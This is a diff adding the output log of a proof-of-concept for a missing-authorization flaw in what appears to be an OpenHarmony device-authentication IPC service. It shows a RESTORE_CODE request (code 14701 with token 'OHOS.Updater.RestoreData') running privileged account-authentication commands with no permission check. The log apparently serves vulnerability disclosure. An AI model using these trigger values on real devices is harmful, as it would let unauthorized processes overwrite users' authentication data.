@@ -1,0 +1,26 @@
+=== PoC: OH-2026-DEVAUTH-RESTORE-001 (CWE-862) ===
+Demonstrating permission bypass via RESTORE_CODE path
+
+--- Step 1: Normal IPC request (code=1) ---
+
+[NORMAL PATH] Entered HandleDeviceAuthCall
+[AUTH] CheckPermission called for methodId=1
+[AUTH] Permission DENIED — operation blocked (correct behavior)
+Result: DENIED (permission checks: 1, privileged ops: 0)
+
+--- Step 2: Malicious RESTORE_CODE request (code=14701) ---
+
+[RESTORE PATH] Entered HandleRestoreCall — NO permission check!
+[PRIV] ExecuteAccountAuthCmd(osAccountId=100, UPGRADE_DATA) — EXECUTED
+[PRIV] This overwrites authentication database for account 100!
+[PRIV] ReloadOsAccountDb(osAccountId=100) — EXECUTED
+[PRIV] Authentication state reloaded — attacker changes now active!
+
+Result: SUCCESS (permission checks: 0, privileged ops: 2)
+
+[VULN] CONFIRMED: RESTORE_CODE path executed privileged operations
+       with ZERO permission checks!
+[VULN] Root cause: OnRemoteRequest dispatches to HandleRestoreCall()
+       which never calls CheckPermission(), unlike HandleDeviceAuthCall().
+[VULN] Impact: Any process that knows code=14701 + token="OHOS.Updater.RestoreData"
+       can execute ExecuteAccountAuthCmd + ReloadOsAccountDb without authorization.
